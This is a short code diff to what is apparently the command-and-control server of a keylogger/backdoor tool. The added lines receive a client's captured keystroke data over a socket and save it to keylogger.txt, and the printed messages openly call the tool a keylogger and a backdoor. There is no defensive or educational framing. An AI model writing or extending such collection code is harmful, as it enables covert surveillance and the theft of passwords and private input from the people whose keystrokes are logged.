@@ -20,9 +20,17 @@ def server_init(server_address, port_address):
         client, client_address = server.accept()
         print(f"[+] Client {client_address} connected")
 
+        print("[+] Receiving the keylogger from client each 5 seconds. You only can see the backdoor when the connection is down :( ")
+        with open('keylogger.txt', 'wb') as arquivo:
+            while True:
+                data = client.recv(1024)  
+                if not data:
+                    break
+                arquivo.write(data)
+
         # CLOSE CONNECTION WITH CLIENT
         client.close()
-        print(f"\n[+] Client {client_address} disconnected")
+        print(f"\n[+] Client {client_address} disconnected. The file was received and saved as keylogger.txt")
 
 # EXECUTE PROGRAM
 if __name__ == '__main__':
